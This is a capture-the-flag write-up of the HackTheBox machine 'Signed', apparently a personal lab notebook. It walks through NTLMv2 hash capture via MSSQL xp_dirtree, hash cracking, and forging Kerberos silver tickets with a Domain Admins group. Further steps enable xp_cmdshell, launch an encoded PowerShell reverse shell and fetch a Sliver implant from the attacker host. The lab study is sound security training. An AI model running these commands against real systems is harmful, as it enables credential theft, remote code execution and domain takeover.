---
created: 2025-10-16
---

📅 `2025-10-16`

#mssql #silver-ticket

----

## 🖥️ Box Info

| ️🏷️ Name         |  `Signed`   |
| --------------- | --- |
| 📆 Release Date | `2025-10-11`    |
| 🌐 IP Address   | `10.10.11.90`   |
| 🖥️ OS           |  `Windows`   |
| 🎯 Difficulty   | `Medium`   |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- Assumed breach as database user `scott`:`Sm230#C5NatH`
- `MSSQL`
- Generate `NTLM` hash from password using `iconv` and `openssl md4`
- Silver ticket attack
- Create silver ticket with the Domain Admins group and leverage the function `OPENROWSET` to retrieve flag contents. This function reads file contents with the permissions of the silver ticket

**🛠️ Tools:**  

- `NetExec`
- `impacket-mssqlclient`
- `impacket-ticketer`

**📚 Learned:**  

- Try capturing hashes by abusing `MSSQL` server functions like `xp_dirtree` combined with `responder`.
- When we have a service account's `NTLM` hash, think silver ticket attack.
- We can generate the `NTLM` hash from the password by converting it from `UTF-8` to `UTF-16LE` with `iconv` and then hashing it with `openssl`'s `md4` (`RC4`) function.
- Learned a bit more on silver ticket attacks with `impacket-ticketer`.

----

## 🌐 Port Scan

- **TCP**: 1433

---

## 🔍 Enumeration

We have only one open port, which is for `MSSQL`. The box is from an assumed breach perspective, and they give us the following `MSSQL` credentials:

- `scott`:`Sm230#C5NatH`

This was a database user, so I had to use `--windows-auth` on `NetExec` for it to work on the `MSSQL` service. I enumerated users, databases, and links, but there was nothing useful. I resorted to stealing the `NTLMv2` hash of the user account running the `MSSQL` server with `responder` and `xp_dirtree`.

```shell
sudo responder -I tun0
```

```shell
impacket-mssqlclient scott:'Sm230#C5NatH'@10.10.11.90

SQL (scott  guest@master)> xp_dirtree \\10.10.14.7\share
subdirectory   depth   file   
------------   -----   ----
```

And we get this in `responder`:

```
[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:84d79d8774742d71:BB417A1A09BCBCD5A990D87B9DBDFE0E:010100000000000000FD2B872A3DDC01E22AD5FDE3A547E8000000000200080038004F004700500001001E00570049004E002D004F00490030004800420043005900330058005200410004003400570049004E002D004F0049003000480042004300590033005800520041002E0038004F00470050002E004C004F00430041004C000300140038004F00470050002E004C004F00430041004C000500140038004F00470050002E004C004F00430041004C000700080000FD2B872A3DDC0106000400020000000800300030000000000000000000000000300000C2B817DE932374A55EAB0351E681E01E63F2EBB5D0251C1EA538AE1821E0CF850A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0037000000000000000000
```

This captured the domain user `mssqlsvc`'s `NTLMv2` hash, which I tried to crack.

```shell
hashcat hashes.txt $ROCKYOU -r /usr/share/hashcat/rules/best66.rule

MSSQLSVC::SIGNED:84d79d8774742d71:bb417a1a09bcbcd5a990d87b9dbdfe0e:010100000000000000fd2b872a3ddc01e22ad5fde3a547e8000000000200080038004f004700500001001e00570049004e002d004f00490030004800420043005900330058005200410004003400570049004e002d004f0049003000480042004300590033005800520041002e0038004f00470050002e004c004f00430041004c000300140038004f00470050002e004c004f00430041004c000500140038004f00470050002e004c004f00430041004c000700080000fd2b872a3ddc0106000400020000000800300030000000000000000000000000300000c2b817de932374a55eab0351e681e01e63f2ebb5d0251c1ea538ae1821e0cf850a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0037000000000000000000:purPLE9795!@
```

Domain credentials:

- `mssqlsvc`:`purPLE9795!@`

---

## 🪜 Foothold / User

I didn't find anything useful with our new account, but it's a service account, which means we can forge a silver ticket. Let's create the `NTLM` hash of the user `mssqlsvc`:

```shell
$ echo -n 'purPLE9795!@' | iconv -f UTF-8 -t UTF-16LE | openssl md4
MD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc
```

And now we must get the `SID` of the domain. We can derive it from the `SID` of any domain login listed by `enum_logins` in `impacket-mssqlclient`.

```
SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0   

##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0   

##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0   

SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0   

NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
```

Since `IT` is the only login from the domain (it's actually a group), we can get its `SID` and trim the part that belongs to the user to get the domain `SID`.

```
SQL (SIGNED\mssqlsvc  guest@master)> select suser_sid('signed\it')
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'
```

It returns the `SID` in a binary format. I found a `Python` one-liner to convert it to `SID` format.

```shell
python -c "import binascii; sid=binascii.unhexlify('0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'); print(f'S-{sid[0]}-{int.from_bytes(sid[2:8],'big')}-{'-'.join(str(int.from_bytes(sid[8+i*4:12+i*4],'little')) for i in range(sid[1]))}')"

S-1-5-21-4088429403-1159899800-2753317549-1105
```

The last part of a `SID` identifies the object, and everything before it is the domain `SID`, so the domain `SID` is:

- `S-1-5-21-4088429403-1159899800-2753317549`

And we include the group part of the `SID` (the `RID`) as the `-groups` parameter. We can now create our silver ticket:

```shell
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain SIGNED.HTB -spn MSSQLSvc/DC01.SIGNED.HTB -groups 1105 Administrator

<SNIP>
[*] Saving ticket in Administrator.ccache
```

And use it to log in as `Administrator`.

```shell
export KRB5CCNAME=Administrator.ccache

impacket-mssqlclient SIGNED.HTB/Administrator@DC01.SIGNED.HTB -k -no-pass

<SNIP>
SQL (SIGNED\Administrator  guest@master)>
```

We are now `sysadmin`, since we are admin on this service.

```shell
SQL (SIGNED\Administrator  dbo@master)> select is_srvrolemember('sysadmin')
    
-   
1
```

>[!note]
>Without the `-groups <RID>` parameter, we don't get `sysadmin`.

This means we can execute `xp_cmdshell` to gain remote code execution.

```shell
SQL (SIGNED\Administrator  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell whoami
output            
---------------   
signed\mssqlsvc
```

Let's get a reverse shell:

```shell
# Attacker Host
nc -lvnp 12345

# Victim
SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAiACwAMQAyADMANAA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

And we got the shell.

```shell
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.10.11.90:49305.

PS C:\Windows\system32> whoami
signed\mssqlsvc
```

I'll get a `sliver` shell.

```shell
sliver > generate --mtls 10.10.14.7:1234 --os windows
sliver > mtls --lhost 10.10.14.7 --lport 1234
```

```shell
mkdir C:\Temp
cd C:\Temp
wget http://10.10.14.7:8000/CROOKED_STATION-WAGON.exe -o sh.exe
.\sh.exe
```

And we got the shell:

```shell
# Sliver server
[*] Session bc3ca459 CROOKED_STATION-WAGON - 10.10.11.90:65407 (DC01) - windows/amd64 - Wed, 15 Oct 2025 21:40:41 -05

sliver > use bc3ca459-b376-4164-9aa3-d1d267266753

sliver (CROOKED_STATION-WAGON) > cd Users

[*] C:\Users

sliver (CROOKED_STATION-WAGON) > ls

C:\Users (7 items, 174 B)
=========================
drwxrwxrwx  Administrator                     <dir>  Tue Oct 07 02:56:23 -0700 2025
Lrw-rw-rw-  All Users -> C:\ProgramData       0 B    Sat Sep 15 00:28:48 -0700 2018
dr-xr-xr-x  Default                           <dir>  Fri Apr 10 10:47:28 -0700 2020
Lrw-rw-rw-  Default User -> C:\Users\Default  0 B    Sat Sep 15 00:28:48 -0700 2018
-rw-rw-rw-  desktop.ini                       174 B  Sat Sep 15 00:16:48 -0700 2018
drwxrwxrwx  mssqlsvc                          <dir>  Thu Oct 02 09:27:27 -0700 2025
dr-xr-xr-x  Public                            <dir>  Fri Apr 10 10:49:00 -0700 2020

sliver (CROOKED_STATION-WAGON) > cd Desktop

[*] C:\Users\mssqlsvc\Desktop

sliver (CROOKED_STATION-WAGON) > ls

C:\Users\mssqlsvc\Desktop (1 item, 34 B)
========================================
-r--r--r--  user.txt  34 B  Mon Oct 13 15:18:43 -0700 2025
```

Got user flag.

---

## 🛡️ Privilege Escalation

I found nothing for a long time, and there wasn't much to enumerate. Eventually I found an `MSSQL` function that reads files using the permissions in our forged ticket, rather than those of the real account behind it. The function is `OPENROWSET()`. Here is the syntax:

```shell
SELECT * FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS DataFile;
```

This means that we need to have some elevated privileges on the machine. We can just include a domain group `SID` in the `impacket-ticketer` command. This time I decided to make a ticket for user `mssqlsvc` but with the group `RID` 512 (Domain Admins). We also have to include the user `ID`, which in this case is 1103.

```shell
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain SIGNED.HTB -spn MSSQLSvc/DC01.SIGNED.HTB -groups 1105,512 -user-id 1103 mssqlsvc
```

>[!error]
>Without the user `ID`, it doesn't work.

I managed to get the root flag like this:

```shell
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS DataFile;
```

Rooted.
